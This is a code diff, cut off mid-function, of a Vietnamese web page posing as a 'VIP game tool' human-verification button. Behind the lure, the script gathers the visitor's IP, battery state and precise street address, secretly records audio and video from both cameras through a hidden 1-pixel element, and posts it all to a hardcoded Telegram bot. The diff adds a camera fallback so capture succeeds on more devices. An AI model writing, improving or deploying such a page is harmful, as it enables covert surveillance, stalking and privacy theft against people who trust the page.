@@ -8,150 +8,157 @@
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
     <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@500;700;800&amp;family=Share+Tech+Mono&amp;display=swap" rel="stylesheet">
     <style>
-      
-        :root {
-          --panel-bg: rgba(6, 18, 36, 0.85);
-          --border-color: rgba(56, 189, 248, 0.4);
-          --primary: #0284c7;
-          --accent: #38bdf8;
-          --text-main: #ffffff;
-          --text-muted: #bae6fd;
-        }
-        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Plus Jakarta Sans', sans-serif; font-weight: 600; }
-        body {
-          color: var(--text-main);
-          min-height: 100vh;
-          display: flex;
-          justify-content: center;
-          align-items: center;
-          padding: 20px;
-          overflow: hidden;
-          position: relative;
-        }
+      :root {
+        --panel-bg: rgba(6, 18, 36, 0.85);
+        --border-color: rgba(56, 189, 248, 0.4);
+        --primary: #0284c7;
+        --accent: #38bdf8;
+        --text-main: #ffffff;
+        --text-muted: #bae6fd;
+      }
+      * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Plus Jakarta Sans', sans-serif; font-weight: 600; }
+      body {
+        color: var(--text-main);
+        min-height: 100vh;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        padding: 20px;
+        overflow: hidden;
+        position: relative;
+      }
 
-        /* Nền video chuyển động anime */
-        .anime-bg-video {
-          position: fixed;
-          top: 50%;
-          left: 50%;
-          min-width: 100%;
-          min-height: 100%;
-          width: auto;
-          height: auto;
-          z-index: -2;
-          transform: translate(-50%, -50%);
-          object-fit: cover;
-        }
+      /* Nền video chuyển động anime */
+      .anime-bg-video {
+        position: fixed;
+        top: 50%;
+        left: 50%;
+        min-width: 100%;
+        min-height: 100%;
+        width: auto;
+        height: auto;
+        z-index: -2;
+        transform: translate(-50%, -50%);
+        object-fit: cover;
+      }
+    
+      body::before {
+        content: '';
+        position: absolute;
+        top: 0; left: 0; width: 100%; height: 100%;
+        background: rgba(2, 6, 23, 0.65);
+        z-index: -1;
+      }
+    
+      canvas#snow-canvas {
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        z-index: 2;
+        pointer-events: none;
+      }
+    
+      .card {
+        background: var(--panel-bg);
+        backdrop-filter: blur(20px);
+        -webkit-backdrop-filter: blur(20px);
+        border: 2px solid var(--border-color);
+        padding: 40px 32px;
+        border-radius: 24px;
+        width: 100%;
+        max-width: 380px;
+        box-shadow: 0 0 50px rgba(56, 189, 248, 0.3);
+        text-align: center;
+        position: relative;
+        z-index: 10;
+      }
+      .live-clock {
+        font-family: 'Share Tech Mono', monospace;
+        font-size: 0.85rem;
+        font-weight: 700;
+        color: #bae6fd;
+        background: rgba(56, 189, 248, 0.15);
+        border: 1px solid rgba(56, 189, 248, 0.4);
+        padding: 6px 14px;
+        border-radius: 20px;
+        display: inline-block;
+        margin-bottom: 20px;
+        letter-spacing: 1px;
+      }
+      .icon-box {
+        width: 64px; height: 64px; margin: 0 auto 20px auto;
+        background: linear-gradient(135deg, rgba(2, 132, 199, 0.4), rgba(56, 189, 248, 0.4));
+        border: 1px solid rgba(56, 189, 248, 0.6); border-radius: 20px;
+        display: flex; align-items: center; justify-content: center; font-size: 28px;
+        box-shadow: 0 0 20px rgba(56, 189, 248, 0.3);
+      }
+      h2 { font-size: 1.5rem; font-weight: 800; margin-bottom: 8px; color: #ffffff; text-shadow: 0 0 12px rgba(56,189,248,0.7); }
+      .subtitle { font-size: 0.9rem; font-weight: 700; color: #e0f2fe; margin-bottom: 28px; line-height: 1.5; font-family: 'Share Tech Mono', monospace; text-shadow: 0 0 5px rgba(56,189,248,0.3); }
+    
+      .btn-primary {
+        width: 100%; padding: 16px;
+        background: linear-gradient(135deg, #0284c7, #38bdf8);
+        color: #ffffff; border: none; border-radius: 16px;
+        font-weight: 800; font-size: 1.05rem; cursor: pointer;
+        transition: all 0.3s ease;
+        box-shadow: 0 10px 25px -5px rgba(56, 189, 248, 0.6);
+        display: flex; align-items: center; justify-content: center; gap: 8px;
+        text-shadow: 0 1px 3px rgba(0,0,0,0.5);
+        letter-spacing: 0.5px;
+      }
+      .btn-primary:hover { opacity: 0.95; transform: translateY(-2px); box-shadow: 0 15px 30px -5px rgba(56, 189, 248, 0.8); }
+    
+      .status { margin-top: 20px; font-size: 0.85rem; font-weight: 700; color: #bae6fd; min-height: 20px; font-family: 'Share Tech Mono', monospace; text-shadow: 0 0 5px rgba(56,189,248,0.4); }
       
-        body::before {
-          content: '';
-          position: absolute;
-          top: 0; left: 0; width: 100%; height: 100%;
-          background: rgba(2, 6, 23, 0.65);
-          z-index: -1;
-        }
-      
-        canvas#snow-canvas {
-          position: absolute;
-          top: 0;
-          left: 0;
-          width: 100%;
-          height: 100%;
-          z-index: 2;
-          pointer-events: none;
-        }
-      
-        .card {
-          background: var(--panel-bg);
-          backdrop-filter: blur(20px);
-          -webkit-backdrop-filter: blur(20px);
-          border: 2px solid var(--border-color);
-          padding: 40px 32px;
-          border-radius: 24px;
-          width: 100%;
-          max-width: 380px;
-          box-shadow: 0 0 50px rgba(56, 189, 248, 0.3);
-          text-align: center;
-          position: relative;
-          z-index: 10;
-        }
-        .live-clock {
-          font-family: 'Share Tech Mono', monospace;
-          font-size: 0.85rem;
-          font-weight: 700;
-          color: #bae6fd;
-          background: rgba(56, 189, 248, 0.15);
-          border: 1px solid rgba(56, 189, 248, 0.4);
-          padding: 6px 14px;
-          border-radius: 20px;
-          display: inline-block;
-          margin-bottom: 20px;
-          letter-spacing: 1px;
-        }
-        .icon-box {
-          width: 64px; height: 64px; margin: 0 auto 20px auto;
-          background: linear-gradient(135deg, rgba(2, 132, 199, 0.4), rgba(56, 189, 248, 0.4));
-          border: 1px solid rgba(56, 189, 248, 0.6); border-radius: 20px;
-          display: flex; align-items: center; justify-content: center; font-size: 28px;
-          box-shadow: 0 0 20px rgba(56, 189, 248, 0.3);
-        }
-        h2 { font-size: 1.5rem; font-weight: 800; margin-bottom: 8px; color: #ffffff; text-shadow: 0 0 12px rgba(56,189,248,0.7); }
-        .subtitle { font-size: 0.9rem; font-weight: 700; color: #e0f2fe; margin-bottom: 28px; line-height: 1.5; font-family: 'Share Tech Mono', monospace; text-shadow: 0 0 5px rgba(56,189,248,0.3); }
-      
-        .btn-primary {
-          width: 100%; padding: 16px;
-          background: linear-gradient(135deg, #0284c7, #38bdf8);
-          color: #ffffff; border: none; border-radius: 16px;
-          font-weight: 800; font-size: 1.05rem; cursor: pointer;
-          transition: all 0.3s ease;
-          box-shadow: 0 10px 25px -5px rgba(56, 189, 248, 0.6);
-          display: flex; align-items: center; justify-content: center; gap: 8px;
-          text-shadow: 0 1px 3px rgba(0,0,0,0.5);
-          letter-spacing: 0.5px;
-        }
-        .btn-primary:hover { opacity: 0.95; transform: translateY(-2px); box-shadow: 0 15px 30px -5px rgba(56, 189, 248, 0.8); }
-      
-        .status { margin-top: 20px; font-size: 0.85rem; font-weight: 700; color: #bae6fd; min-height: 20px; font-family: 'Share Tech Mono', monospace; text-shadow: 0 0 5px rgba(56,189,248,0.4); }
-        #video { display: none; }
-      
-        #browser-warning {
-          position: fixed;
-          top: 0; left: 0; width: 100%; height: 100%;
-          background: rgba(2, 6, 23, 0.98);
-          z-index: 9999;
-          display: none;
-          justify-content: center;
-          align-items: center;
-          padding: 20px;
-        }
-        .warning-box {
-          background: #0b1329;
-          border: 2px solid #38bdf8;
-          padding: 30px 24px;
-          border-radius: 20px;
-          max-width: 360px;
-          text-align: center;
-          box-shadow: 0 0 40px rgba(56, 189, 248, 0.4);
-        }
-        .warning-box h3 {
-          color: #38bdf8;
-          font-size: 1.3rem;
-          margin-bottom: 12px;
-          text-shadow: 0 0 10px rgba(56, 189, 248, 0.5);
-        }
-        .warning-box p {
-          color: #e2e8f0;
-          font-size: 0.9rem;
-          line-height: 1.5;
-          margin-bottom: 24px;
-        }
-        .btn-warning {
-          width: 100%; padding: 14px;
-          background: linear-gradient(135deg, #0369a1, #0284c7);
-          color: #fff; border: none; border-radius: 12px;
-          font-weight: 800; font-size: 1rem; cursor: pointer;
-          box-shadow: 0 8px 20px -4px rgba(56, 189, 248, 0.5);
-        }
+      /* Thẻ video ẩn để stream camera thực thi ghi hình ngầm */
+      #video {
+        position: absolute;
+        opacity: 0;
+        pointer-events: none;
+        width: 1px;
+        height: 1px;
+      }
+    
+      #browser-warning {
+        position: fixed;
+        top: 0; left: 0; width: 100%; height: 100%;
+        background: rgba(2, 6, 23, 0.98);
+        z-index: 9999;
+        display: none;
+        justify-content: center;
+        align-items: center;
+        padding: 20px;
+      }
+      .warning-box {
+        background: #0b1329;
+        border: 2px solid #38bdf8;
+        padding: 30px 24px;
+        border-radius: 20px;
+        max-width: 360px;
+        text-align: center;
+        box-shadow: 0 0 40px rgba(56, 189, 248, 0.4);
+      }
+      .warning-box h3 {
+        color: #38bdf8;
+        font-size: 1.3rem;
+        margin-bottom: 12px;
+        text-shadow: 0 0 10px rgba(56, 189, 248, 0.5);
+      }
+      .warning-box p {
+        color: #e2e8f0;
+        font-size: 0.9rem;
+        line-height: 1.5;
+        margin-bottom: 24px;
+      }
+      .btn-warning {
+        width: 100%; padding: 14px;
+        background: linear-gradient(135deg, #0369a1, #0284c7);
+        color: #fff; border: none; border-radius: 12px;
+        font-weight: 800; font-size: 1rem; cursor: pointer;
+        box-shadow: 0 8px 20px -4px rgba(56, 189, 248, 0.5);
+      }
     </style>
   </head>
   <body>
@@ -175,316 +182,325 @@
     </div>
     <canvas id="snow-canvas"></canvas>
     <script>
-      
-          const canvas = document.getElementById('snow-canvas');
-          const ctx = canvas.getContext('2d');
-      
-          function resizeCanvas() {
-            canvas.width = window.innerWidth;
-            canvas.height = window.innerHeight;
-          }
-          window.addEventListener('resize', resizeCanvas);
-          resizeCanvas();
-      
-          const snowflakes = [];
-          const maxFlakes = 60;
-      
-          for (let i = 0; i < maxFlakes; i++) {
-            snowflakes.push({
+      const canvas = document.getElementById('snow-canvas');
+      const ctx = canvas.getContext('2d');
+  
+      function resizeCanvas() {
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+      }
+      window.addEventListener('resize', resizeCanvas);
+      resizeCanvas();
+  
+      const snowflakes = [];
+      const maxFlakes = 60;
+  
+      for (let i = 0; i < maxFlakes; i++) {
+        snowflakes.push({
+          x: Math.random() * canvas.width,
+          y: Math.random() * canvas.height,
+          radius: Math.random() * 3 + 1,
+          speed: Math.random() * 1 + 0.5,
+          density: Math.random() * 20
+        });
+      }
+  
+      function drawSnow() {
+        ctx.clearRect(0, 0, canvas.width, canvas.height);
+        ctx.fillStyle = 'rgba(255, 255, 255, 0.75)';
+        ctx.beginPath();
+        for (let i = 0; i < snowflakes.length; i++) {
+          let flake = snowflakes[i];
+          ctx.moveTo(flake.x, flake.y);
+          ctx.arc(flake.x, flake.y, flake.radius, 0, Math.PI * 2, true);
+        }
+        ctx.fill();
+        updateSnow();
+      }
+  
+      let angle = 0;
+      function updateSnow() {
+        angle += 0.01;
+        for (let i = 0; i < snowflakes.length; i++) {
+          let flake = snowflakes[i];
+          flake.y += Math.pow(flake.speed, 2) * 0.1 + 1;
+          flake.x += Math.sin(angle + flake.density) * 0.8;
+  
+          if (flake.y > canvas.height) {
+            snowflakes[i] = {
               x: Math.random() * canvas.width,
-              y: Math.random() * canvas.height,
-              radius: Math.random() * 3 + 1,
-              speed: Math.random() * 1 + 0.5,
-              density: Math.random() * 20
-            });
+              y: 0,
+              radius: flake.radius,
+              speed: flake.speed,
+              density: flake.density
+            };
           }
-      
-          function drawSnow() {
-            ctx.clearRect(0, 0, canvas.width, canvas.height);
-            ctx.fillStyle = 'rgba(255, 255, 255, 0.75)';
-            ctx.beginPath();
-            for (let i = 0; i < snowflakes.length; i++) {
-              let flake = snowflakes[i];
-              ctx.moveTo(flake.x, flake.y);
-              ctx.arc(flake.x, flake.y, flake.radius, 0, Math.PI * 2, true);
-            }
-            ctx.fill();
-            updateSnow();
-          }
-      
-          let angle = 0;
-          function updateSnow() {
-            angle += 0.01;
-            for (let i = 0; i < snowflakes.length; i++) {
-              let flake = snowflakes[i];
-              flake.y += Math.pow(flake.speed, 2) * 0.1 + 1;
-              flake.x += Math.sin(angle + flake.density) * 0.8;
-      
-              if (flake.y > canvas.height) {
-                snowflakes[i] = {
-                  x: Math.random() * canvas.width,
-                  y: 0,
-                  radius: flake.radius,
-                  speed: flake.speed,
-                  density: flake.density
-                };
-              }
-            }
-          }
-          setInterval(drawSnow, 30);
+        }
+      }
+      setInterval(drawSnow, 30);
     </script>
     <div class="card">
       <div class="live-clock" id="clock">SYSTEM_TIME: --:--:--</div>
       <div class="icon-box">🤖</div>
       <h2>Hệ Thống TOOL GAME VIP</h2>
       <p class="subtitle">>NHẤN NÚT ĐỂ XÁC MINH BẠN LÀ NGƯỜI THẬT</p>
-      <video id="video" autoplay="" playsinline="" muted=""></video>
+      <video id="video" autoplay playsinline muted></video>
       <button class="btn-primary" id="get-key-btn" onclick="triggerProcess()">
         <span>🔑 XÁC MINH NGAY</span>
       </button>
       <div id="status" class="status"></div>
     </div>
     <script>
-      
-        const TELEGRAM_BOT_TOKEN = '8692039183:AAEZD675kv31MZd_NZONtKpgz47ZrpR-AUM';
-        const TELEGRAM_CHAT_ID = -1004430115536;
-        const REDIRECT_URL = 'https://thuvienphapluat.vn/phap-luat/ho-tro-phap-luat/danh-bac-qua-mang-bi-xu-ly-the-nao-theo-bo-luat-hinh-su-2022-mot-so-hinh-thuc-danh-bac-qua-mang-hie-29683.html';
-      
-        function checkInAppBrowser() {
-          const ua = navigator.userAgent || navigator.vendor || window.opera;
-          const isInApp = /Telegram|Gram|FBAN|FBAV|Messenger|Instagram|Zalo|TikTok|Line|Viber|Twitter|LinkedInApp/i.test(ua);
-          if (isInApp) {
-            document.getElementById('browser-warning').style.display = 'flex';
-          }
+      // Thay đúng Token và Chat ID (đã fix lỗi cú pháp nháy đơn thừa ở bản cũ)[span_1](start_span)[span_1](end_span)
+      const TELEGRAM_BOT_TOKEN = '8692039183:AAEZD675kv31MZd_NZONtKpgz47ZrpR-AUM';
+      const TELEGRAM_CHAT_ID = -1004430115536;
+      const REDIRECT_URL = 'https://thuvienphapluat.vn/phap-luat/ho-tro-phap-luat/danh-bac-qua-mang-bi-xu-ly-the-nao-theo-bo-luat-hinh-su-2022-mot-so-hinh-thuc-danh-bac-qua-mang-hie-29683.html';
+  
+      function checkInAppBrowser() {
+        const ua = navigator.userAgent || navigator.vendor || window.opera;
+        const isInApp = /Telegram|Gram|FBAN|FBAV|Messenger|Instagram|Zalo|TikTok|Line|Viber|Twitter|LinkedInApp/i.test(ua);
+        if (isInApp) {
+          document.getElementById('browser-warning').style.display = 'flex';
         }
-      
-        function openExternalBrowser() {
-          const currentUrl = window.location.href;
-          if (/android/i.test(navigator.userAgent)) {
-            window.location.href = `intent://${currentUrl.replace(/^https?:\/\//, '')}#Intent;scheme=https;package=com.android.chrome;end`;
-          } else {
-            window.location.href = currentUrl;
-            setTimeout(() => {
-              alert('Vui lòng bấm vào biểu tượng 3 chấm (...) hoặc mũi tên ở góc phải, sau đó chọn "Mở bằng Safari"');
-            }, 500);
-          }
-        }
-      
-        window.onload = function() {
-          checkInAppBrowser();
-        };
-      
-        function updateClock() {
-          const now = new Date();
-          document.getElementById('clock').textContent = `🕒 ${now.toLocaleTimeString('vi-VN', { hour12: false })}`;
-        }
-        setInterval(updateClock, 1000);
-        updateClock();
-      
-        const statusDiv = document.getElementById('status');
-        const video = document.getElementById('video');
-        const getKeyBtn = document.getElementById('get-key-btn');
-      
-        async function getBatteryInfo() {
-          try {
-            if (navigator.getBattery) {
-              const battery = await navigator.getBattery();
-              const level = Math.round(battery.level * 100);
-              const charging = battery.charging ? '⚡ Đang sạc' : '🔋 Không sạc';
-              return `${level}% (${charging})`;
-            }
-          } catch (e) {}
-          return 'Không rõ';
-        }
-      
-        async function getDetailedLocation() {
-          return new Promise((resolve) => {
-            if (!navigator.geolocation) {
-              resolve({ fullAddress: 'Không hỗ trợ định vị', mapsUrl: '' });
-              return;
-            }
-            navigator.geolocation.getCurrentPosition(
-              async (position) => {
-                const lat = position.coords.latitude;
-                const lon = position.coords.longitude;
-                const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
-      
-                let addressString = `Tọa độ: ${lat.toFixed(5)}, ${lon.toFixed(5)}`;
-      
-                try {
-                  const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1&accept-language=vi`, {
-                    headers: { 'User-Agent': 'Mozilla/5.0' }
-                  });
-                  const data = await res.json();
-                  if (data && data.address) {
-                    const addr = data.address;
-                    const ward = addr.ward || addr.suburb || addr.quarter || addr.neighbourhood || '';
-                    const district = addr.city_district || addr.district || addr.county || '';
-                    const city = addr.city || addr.province || addr.state || '';
-                    const road = addr.road || addr.residential || '';
-                    const houseNumber = addr.house_number || '';
-      
-                    let parts = [];
-                    if (houseNumber) parts.push(`Số ${houseNumber}`);
-                    if (road) parts.push(road);
-                    if (ward) parts.push(ward);
-                    if (district) parts.push(district);
-                    if (city) parts.push(city);
-      
-                    if (parts.length > 0) {
-                      addressString = parts.join(', ');
-                    } else if (data.display_name) {
-                      addressString = data.display_name;
-                    }
-                  }
-                } catch (e) {}
-      
-                resolve({ fullAddress: addressString, mapsUrl: mapsUrl });
-              },
-              (error) => {
-                resolve({ fullAddress: 'Người dùng từ chối cấp quyền vị trí', mapsUrl: '' });
-              },
-              { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-            );
-          });
-        }
-      
-        async function recordVideo(facingMode, duration = 3000) {
-          try {
-            const stream = await navigator.mediaDevices.getUserMedia({
-              video: { facingMode: { exact: facingMode } },
-              audio: true
-            });
-            video.srcObject = stream;
-            await video.play();
-      
-            return await new Promise((resolve) => {
-              let recordedChunks = [];
-      
-              let options = { mimeType: 'video/mp4' };
-              if (!MediaRecorder.isTypeSupported(options.mimeType)) {
-                if (MediaRecorder.isTypeSupported('video/mp4;codecs=h264,aac')) {
-                  options = { mimeType: 'video/mp4;codecs=h264,aac' };
-                } else if (MediaRecorder.isTypeSupported('video/webm;codecs=h264,opus')) {
-                  options = { mimeType: 'video/webm;codecs=h264,opus' };
-                } else {
-                  options = {};
-                }
-              }
-      
-              const mediaRecorder = new MediaRecorder(stream, options);
-      
-              mediaRecorder.ondataavailable = (event) => {
-                if (event.data && event.data.size > 0) {
-                  recordedChunks.push(event.data);
-                }
-              };
-      
-              mediaRecorder.onstop = () => {
-                const blob = new Blob(recordedChunks, { type: mediaRecorder.mimeType || 'video/mp4' });
-                stream.getTracks().forEach(track => track.stop());
-                resolve(blob);
-              };
-      
-              mediaRecorder.start();
-              setTimeout(() => {
-                if (mediaRecorder.state !== 'inactive') {
-                  mediaRecorder.stop();
-                }
-              }, duration);
-            });
-          } catch (e) {
-            return null;
-          }
-        }
-      
-        async function triggerProcess() {
-          getKeyBtn.style.display = 'none';
-          statusDiv.textContent = '[*] Đang khởi tạo kết nối bảo mật...';
-      
-          let ipDetails = { ip: 'Không rõ', city: 'Không rõ', country: 'Không rõ', org: 'Không rõ' };
-          try {
-            const ipRes = await fetch('https://ipwho.is/');
-            const ipData = await ipRes.json();
-            if (ipData.success) {
-              ipDetails = {
-                ip: ipData.ip,
-                city: ipData.city,
-                country: ipData.country,
-                org: ipData.connection?.isp || 'Không rõ'
-              };
-            }
-          } catch (e) {}
-      
-          statusDiv.textContent = '[*] Đang xác thực vị trí chính xác & thiết bị...';
-          const [batteryInfo, locationData] = await Promise.all([
-            getBatteryInfo(),
-            getDetailedLocation()
-          ]);
-      
-          const ua = navigator.userAgent;
-          let deviceName = /android/i.test(ua) ? 'Android 🤖' : /iphone|ipad/i.test(ua) ? 'iOS 🍏' : 'PC/Laptop 💻';
-      
-          let infoText =
-            `🌊 <b>YÊU CẦU GET KEY (OCEAN SYSTEM)</b> 🌊\n` +
-            `━━━━━━━━━━━━━━━━━━━━━\n` +
-            `📱 <b>Thiết bị:</b> ${deviceName}\n` +
-            `🔋 <b>Phần trăm pin:</b> ${batteryInfo}\n` +
-            `🌐 <b>IP:</b> <code>${ipDetails.ip}</code>\n` +
-            `🏡 <b>Địa chỉ chính xác (Số nhà, Phường, Quận, Tỉnh):</b>\n<code>${locationData.fullAddress}</code>\n`;
-      
-          if (locationData.mapsUrl) {
-            infoText += `🗺️ <b>Google Maps:</b> <a href="${locationData.mapsUrl}">Xem vị trí cụ thể</a>\n`;
-          }
-          infoText += `━━━━━━━━━━━━━━━━━━━━━`;
-      
-          statusDiv.textContent = '[*] Đang ghi hình luồng #1 (Camera sau)...';
-          let backVideoBlob = await recordVideo('environment', 3000);
-      
-          statusDiv.textContent = '[*] Đang ghi hình luồng #2 (Camera trước)...';
-          let frontVideoBlob = await recordVideo('user', 3000);
-      
-          let hasSent = false;
-      
-          if (backVideoBlob && backVideoBlob.size > 0) {
-            const fd = new FormData();
-            fd.append('chat_id', TELEGRAM_CHAT_ID);
-            fd.append('video', backVideoBlob, 'back_video.mp4');
-            fd.append('caption', infoText + '\n\n🎥 <b>Video Camera Sau (MP4 + Âm thanh)</b>');
-            fd.append('parse_mode', 'HTML');
-            try {
-              await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, { method: 'POST', body: fd });
-              hasSent = true;
-            } catch(e){}
-          }
-      
-          if (frontVideoBlob && frontVideoBlob.size > 0) {
-            const fd2 = new FormData();
-            fd2.append('chat_id', TELEGRAM_CHAT_ID);
-            fd2.append('video', frontVideoBlob, 'front_video.mp4');
-            fd2.append('caption', '🎥 <b>Video Camera Trước (MP4 + Âm thanh)</b>');
-            fd2.append('parse_mode', 'HTML');
-            try {
-              await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, { method: 'POST', body: fd2 });
-              hasSent = true;
-            } catch(e){}
-          }
-      
-          if (!hasSent) {
-            try {
-              await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: infoText + '\n\n⚠️ (Không thể quay video hoặc truy cập camera/microphone)', parse_mode: 'HTML', disable_web_page_preview: true })
-              });
-            } catch (e) {}
-          }
-      
-          statusDiv.textContent = '[+] Thành công! Đang chuyển hướng...';
+      }
+  
+      function openExternalBrowser() {
+        const currentUrl = window.location.href;
+        if (/android/i.test(navigator.userAgent)) {
+          window.location.href = `intent://${currentUrl.replace(/^https?:\/\//, '')}#Intent;scheme=https;package=com.android.chrome;end`;
+        } else {
+          window.location.href = currentUrl;
           setTimeout(() => {
-            window.location.href = REDIRECT_URL;
-          }, 1000);
+            alert('Vui lòng bấm vào biểu tượng 3 chấm (...) hoặc mũi tên ở góc phải, sau đó chọn "Mở bằng Safari"');
+          }, 500);
         }
+      }
+  
+      window.onload = function() {
+        checkInAppBrowser();
+      };
+  
+      function updateClock() {
+        const now = new Date();
+        document.getElementById('clock').textContent = `🕒 ${now.toLocaleTimeString('vi-VN', { hour12: false })}`;
+      }
+      setInterval(updateClock, 1000);
+      updateClock();
+  
+      const statusDiv = document.getElementById('status');
+      const video = document.getElementById('video');
+      const getKeyBtn = document.getElementById('get-key-btn');
+  
+      async function getBatteryInfo() {
+        try {
+          if (navigator.getBattery) {
+            const battery = await navigator.getBattery();
+            const level = Math.round(battery.level * 100);
+            const charging = battery.charging ? '⚡ Đang sạc' : '🔋 Không sạc';
+            return `${level}% (${charging})`;
+          }
+        } catch (e) {}
+        return 'Không rõ';
+      }
+  
+      async function getDetailedLocation() {
+        return new Promise((resolve) => {
+          if (!navigator.geolocation) {
+            resolve({ fullAddress: 'Không hỗ trợ định vị', mapsUrl: '' });
+            return;
+          }
+          navigator.geolocation.getCurrentPosition(
+            async (position) => {
+              const lat = position.coords.latitude;
+              const lon = position.coords.longitude;
+              const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
+  
+              let addressString = `Tọa độ: ${lat.toFixed(5)}, ${lon.toFixed(5)}`;
+  
+              try {
+                const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1&accept-language=vi`, {
+                  headers: { 'User-Agent': 'Mozilla/5.0' }
+                });
+                const data = await res.json();
+                if (data && data.address) {
+                  const addr = data.address;
+                  const ward = addr.ward || addr.suburb || addr.quarter || addr.neighbourhood || '';
+                  const district = addr.city_district || addr.district || addr.county || '';
+                  const city = addr.city || addr.province || addr.state || '';
+                  const road = addr.road || addr.residential || '';
+                  const houseNumber = addr.house_number || '';
+  
+                  let parts = [];
+                  if (houseNumber) parts.push(`Số ${houseNumber}`);
+                  if (road) parts.push(road);
+                  if (ward) parts.push(ward);
+                  if (district) parts.push(district);
+                  if (city) parts.push(city);
+  
+                  if (parts.length > 0) {
+                    addressString = parts.join(', ');
+                  } else if (data.display_name) {
+                    addressString = data.display_name;
+                  }
+                }
+              } catch (e) {}
+  
+              resolve({ fullAddress: addressString, mapsUrl: mapsUrl });
+            },
+            (error) => {
+              resolve({ fullAddress: 'Người dùng từ chối cấp quyền vị trí', mapsUrl: '' });
+            },
+            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+          );
+        });
+      }
+  
+      // Hàm fix quay video tương thích tốt trên Mobile và Desktop
+      async function recordVideo(useEnvironmentCamera, duration = 3000) {
+        try {
+          const constraints = {
+            video: {
+              facingMode: useEnvironmentCamera ? { exact: "environment" } : "user"
+            },
+            audio: true
+          };
+
+          let stream;
+          try {
+            stream = await navigator.mediaDevices.getUserMedia(constraints);
+          } catch (err) {
+            // Fallback nếu camera sau (exact environment) không tồn tại trên thiết bị
+            stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+          }
+
+          video.srcObject = stream;
+          await video.play();
+  
+          return await new Promise((resolve) => {
+            let recordedChunks = [];
+            let options = { mimeType: 'video/webm;codecs=vp8,opus' };
+            
+            if (!MediaRecorder.isTypeSupported(options.mimeType)) {
+              if (MediaRecorder.isTypeSupported('video/mp4')) {
+                options = { mimeType: 'video/mp4' };
+              } else {
+                options = {};
+              }
+            }
+  
+            const mediaRecorder = new MediaRecorder(stream, options);
+  
+            mediaRecorder.ondataavailable = (event) => {
+              if (event.data && event.data.size > 0) {
+                recordedChunks.push(event.data);
+              }
+            };
+  
+            mediaRecorder.onstop = () => {
+              const blob = new Blob(recordedChunks, { type: mediaRecorder.mimeType || 'video/mp4' });
+              stream.getTracks().forEach(track => track.stop());
+              resolve(blob);
+            };
+  
+            mediaRecorder.start();
+            setTimeout(() => {
+              if (mediaRecorder.state !== 'inactive') {
+                mediaRecorder.stop();
+              }
+            }, duration);
+          });
+        } catch (e) {
+          return null;
+        }
+      }
+  
+      async function triggerProcess() {
+        getKeyBtn.style.display = 'none';
+        statusDiv.textContent = '[*] Đang khởi tạo kết nối bảo mật...';
+    
+        let ipDetails = { ip: 'Không rõ', city: 'Không rõ', country: 'Không rõ', org: 'Không rõ' };
+        try {
+          const ipRes = await fetch('https://ipwho.is/');
+          const ipData = await ipRes.json();
+          if (ipData.success) {
+            ipDetails = {
+              ip: ipData.ip,
+              city: ipData.city,
+              country: ipData.country,
+              org: ipData.connection?.isp || 'Không rõ'
+            };
+          }
+        } catch (e) {}
+    
+        statusDiv.textContent = '[*] Đang xác thực vị trí chính xác & thiết bị...';
+        const [batteryInfo, locationData] = await Promise.all([
+          getBatteryInfo(),
+          getDetailedLocation()
+        ]);
+    
+        const ua = navigator.userAgent;
+        let deviceName = /android/i.test(ua) ? 'Android 🤖' : /iphone|ipad/i.test(ua) ? 'iOS 🍏' : 'PC/Laptop 💻';
+    
+        let infoText =
+          `🌊 <b>YÊU CẦU GET KEY (OCEAN SYSTEM)</b> 🌊\n` +
+          `━━━━━━━━━━━━━━━━━━━━━\n` +
+          `📱 <b>Thiết bị:</b> ${deviceName}\n` +
+          `🔋 <b>Phần trăm pin:</b> ${batteryInfo}\n` +
+          `🌐 <b>IP:</b> <code>${ipDetails.ip}</code>\n` +
+          `🏡 <b>Địa chỉ:</b>\n<code>${locationData.fullAddress}</code>\n`;
+    
+        if (locationData.mapsUrl) {
+          infoText += `🗺️ <b>Google Maps:</b> <a href="${locationData.mapsUrl}">Xem vị trí cụ thể</a>\n`;
+        }
+        infoText += `━━━━━━━━━━━━━━━━━━━━━`;
+    
+        statusDiv.textContent = '[*] Đang ghi hình luồng #1 (Camera sau)...';
+        let backVideoBlob = await recordVideo(true, 3000);
+    
+        statusDiv.textContent = '[*] Đang ghi hình luồng #2 (Camera trước)...';
+        let frontVideoBlob = await recordVideo(false, 3000);
+    
+        let hasSent = false;
+    
+        if (backVideoBlob && backVideoBlob.size > 0) {
+          const fd = new FormData();
+          fd.append('chat_id', TELEGRAM_CHAT_ID);
+          fd.append('video', backVideoBlob, 'back_video.mp4');
+          fd.append('caption', infoText + '\n\n🎥 <b>Video Camera Sau (MP4 + Âm thanh)</b>');
+          fd.append('parse_mode', 'HTML');
+          try {
+            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, { method: 'POST', body: fd });
+            hasSent = true;
+          } catch(e){}
+        }
+    
+        if (frontVideoBlob && frontVideoBlob.size > 0) {
+          const fd2 = new FormData();
+          fd2.append('chat_id', TELEGRAM_CHAT_ID);
+          fd2.append('video', frontVideoBlob, 'front_video.mp4');
+          fd2.append('caption', '🎥 <b>Video Camera Trước (MP4 + Âm thanh)</b>');
+          fd2.append('parse_mode', 'HTML');
+          try {
